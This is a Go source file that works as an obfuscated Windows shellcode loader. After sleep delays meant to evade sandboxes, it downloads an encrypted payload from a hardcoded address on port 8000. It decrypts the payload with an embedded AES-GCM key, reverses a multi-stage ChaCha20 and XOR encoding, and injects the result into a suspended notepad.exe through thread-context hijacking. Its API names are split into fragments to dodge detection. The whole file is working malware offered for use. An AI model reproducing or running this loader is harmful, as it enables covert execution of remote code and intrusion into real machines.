package main

import(
"crypto/aes"
"crypto/cipher"
"encoding/hex"
"fmt"
"io"
"net/http"
"os"
"syscall"
"time"
"unsafe"
"golang.org/x/crypto/chacha20"
)

const(a=4;b=4096;c=8192;d=64;e uintptr=1048587)

// PARAMETERS from encoder v2.py - UPDATE THESE WITH YOUR ENCODED PAYLOAD
const(f=3860268504;g=0x92;h=5;j=0x53;k=0x7e;l=8;m=0x7c;n=682;o=1461)

var(p,q string)

type r struct{Cb uint32;_ *uint16;Desktop,Title *uint16;X,Y,XSize,YSize,XCountChars,YCountChars,FillAttribute uint32;Flags uint32;ShowWindow uint16;_ uint16;_ *byte;StdInput,StdOutput,StdError uintptr}
type s struct{Process,Thread uintptr;ProcessId,ThreadId uint32}
type t struct{P1Home,P2Home,P3Home,P4Home,P5Home,P6Home uint64;ContextFlags,MxCsr uint32;SegCs,SegDs,SegEs,SegFs,SegGs,SegSs uint16;EFlags uint32;Dr0,Dr1,Dr2,Dr3,Dr6,Dr7,Rax,Rcx,Rdx,Rbx,Rsp,Rbp,Rsi,Rdi,R8,R9,R10,R11,R12,R13,R14,R15,Rip uint64;FltSave[512]byte;VectorRegister[26][16]byte;VectorControl,DebugControl,LastBranchToRip,LastBranchFromRip,LastExceptionToRip,LastExceptionFromRip uint64}

var(u=syscall.NewLazyDLL("ker"+"nel"+"32"+".dll");v=syscall.NewLazyDLL("ntd"+"ll"+".dll");w=u.NewProc("Cre"+"ate"+"Pro"+"cess"+"A");x=u.NewProc("Vir"+"tual"+"All"+"oc"+"Ex");y=u.NewProc("Wri"+"te"+"Pro"+"cess"+"Mem"+"ory");z=u.NewProc("Rea"+"d"+"Pro"+"cess"+"Mem"+"ory");A=u.NewProc("Get"+"Thr"+"ead"+"Con"+"text");B=u.NewProc("Set"+"Thr"+"ead"+"Con"+"text");C=u.NewProc("Res"+"ume"+"Thr"+"ead");D=v.NewProc("Nt"+"Unm"+"ap"+"View"+"Of"+"Sec"+"tion"))

func E(F[]byte,G byte)(H[]byte){H=make([]byte,len(F));for I,J:=range F{H[I]=J^G};return}
func K(F[]byte)(H[]byte){H=make([]byte,len(F));for I,J:=range F{H[I]=^J};return}
func L(F[]byte,M int)(H[]byte){H=make([]byte,len(F));for I,J:=range F{H[I]=byte((int(J)>>M)|(int(J)<<(8-M)))};return}
func N(F[]byte,G byte)(H[]byte){H=make([]byte,len(F));for I,J:=range F{H[I]=(J-G)&255};return}
func O(F[]byte)(H[]byte){H=make([]byte,len(F));copy(H,F);for I:=0;I<len(H)-1;I+=2{H[I],H[I+1]=H[I+1],H[I]};return}
func S(F[]byte,T int)(H[]byte){H=make([]byte,0,len(F));for I:=0;I<len(F);I+=T{U:=I+T;if U>len(F){U=len(F)};V:=F[I:U];for W:=len(V)-1;W>=0;W--{H=append(H,V[W])}};return}
func X(F[]byte)(H[]byte){Y,_:=hex.DecodeString(p);Z,_:=hex.DecodeString(q);AA,_:=chacha20.NewUnauthenticatedCipher(Y,Z);H=make([]byte,len(F));AA.XORKeyStream(H,F);return}
func AB(F[]byte)(H[]byte){AC:=[]byte{170,187,204,221};H=make([]byte,0,len(F)/2);for I:=0;I<len(F);{AD:=false;for _,AE:=range AC{if I<len(F)&&F[I]==AE{AD=true;break}};if AD&&I+1<len(F){H=append(H,F[I+1]);I+=2}else{I++}};return}
func AF(AG[]byte)(AH[]byte){AH=E(AG,m);AH=AB(AH);AH=X(AH);AH=S(AH,l);AH=E(AH,k);AH=O(AH);AH=N(AH,j);AH=L(AH,h);AH=K(AH);AH=E(AH,g);if len(AH)>n{AH=AH[:n]};return}
func AI(AJ string)([]byte,error){AK:=&http.Client{Timeout:30*time.Second};AL,AM:=AK.Get(AJ);if AM!=nil{return nil,AM};defer AL.Body.Close();if AL.StatusCode!=200{return nil,fmt.Errorf("bad")};return io.ReadAll(AL.Body)}
func AN(AG[]byte,AO string)([]byte,error){AP:=make([]byte,32);for I:=0;I<32;I++{fmt.Sscanf(AO[I*2:I*2+2],"%02x",&AP[I])};AQ,_:=aes.NewCipher(AP);AR,_:=cipher.NewGCM(AQ);if len(AG)<AR.NonceSize(){return nil,fmt.Errorf("short")};return AR.Open(nil,AG[:AR.NonceSize()],AG[AR.NonceSize():],nil)}
func AS(AT string)(*s,error){var AU r;var AV s;AU.Cb=uint32(unsafe.Sizeof(AU));AW,_:=syscall.BytePtrFromString(AT);AX,_,_:=w.Call(0,uintptr(unsafe.Pointer(AW)),0,0,0,a,0,0,uintptr(unsafe.Pointer(&AU)),uintptr(unsafe.Pointer(&AV)));if AX==0{return nil,fmt.Errorf("fail")};return&AV,nil}
func AY(AZ uintptr,BA*t)error{BA.ContextFlags=uint32(e);BB,_,_:=A.Call(AZ,uintptr(unsafe.Pointer(BA)));if BB==0{return fmt.Errorf("fail")};return nil}
func BJ(BD uintptr,BE uintptr,BK[]byte)error{var BL uintptr;BM,_,_:=y.Call(BD,BE,uintptr(unsafe.Pointer(&BK[0])),uintptr(len(BK)),uintptr(unsafe.Pointer(&BL)));if BM==0{return fmt.Errorf("fail")};return nil}
func BN(AZ uintptr,BA*t)error{BO,_,_:=B.Call(AZ,uintptr(unsafe.Pointer(BA)));if BO==0{return fmt.Errorf("fail")};return nil}
func BP(AZ uintptr)error{BQ,_,_:=C.Call(AZ);if BQ==4294967295{return fmt.Errorf("fail")};return nil}
func BR(BS[]byte,AT string)error{AV,_:=AS(AT);if AV==nil{return fmt.Errorf("proc")};var BA t;if AY(AV.Thread,&BA)!=nil{syscall.TerminateProcess(syscall.Handle(AV.Process),1);syscall.CloseHandle(syscall.Handle(AV.Process));syscall.CloseHandle(syscall.Handle(AV.Thread));return fmt.Errorf("ctx")};BZ,_,_:=x.Call(uintptr(AV.Process),0,uintptr(len(BS)),b|c,d);if BZ==0{syscall.TerminateProcess(syscall.Handle(AV.Process),1);syscall.CloseHandle(syscall.Handle(AV.Process));syscall.CloseHandle(syscall.Handle(AV.Thread));return fmt.Errorf("alloc")};if BJ(AV.Process,BZ,BS)!=nil{syscall.TerminateProcess(syscall.Handle(AV.Process),1);syscall.CloseHandle(syscall.Handle(AV.Process));syscall.CloseHandle(syscall.Handle(AV.Thread));return fmt.Errorf("write")};BA.Rip=uint64(BZ);BA.Rsp=(BA.Rsp&^0xF)-8;if BN(AV.Thread,&BA)!=nil{syscall.TerminateProcess(syscall.Handle(AV.Process),1);syscall.CloseHandle(syscall.Handle(AV.Process));syscall.CloseHandle(syscall.Handle(AV.Thread));return fmt.Errorf("setctx")};time.Sleep(time.Second);if BP(AV.Thread)!=nil{syscall.TerminateProcess(syscall.Handle(AV.Process),1);syscall.CloseHandle(syscall.Handle(AV.Process));syscall.CloseHandle(syscall.Handle(AV.Thread));return fmt.Errorf("resume")};return nil}

func main(){
time.Sleep(15*time.Second)
BZ,_:=AI("http"+"://"+"192"+".168"+".88"+".166"+":8000"+"/pay"+"load"+"_sta"+"ged"+"_ssl"+".enc")
if BZ==nil{os.Exit(1)}
CA,_:=AN(BZ,"581206dc516b49c310289c8e7b2f41674b88c3420653d6afd37e151d5562b0f3")
if CA==nil{os.Exit(1)}
p="63e6df7f9518df51afb7d38b2cf4c53400c1c15113141dc4dd8af3fc38b59505"
q="753727a1d6e8cbdc9ac6f895"
CB:=AF(CA)
if len(CB)!=n{os.Exit(1)}
time.Sleep(10*time.Second)
BR(CB,"C:\\\\"+"Win"+"dows"+"\\\\"+"Sys"+"tem"+"32"+"\\\\"+"note"+"pad"+".exe")
time.Sleep(300*time.Second)
}
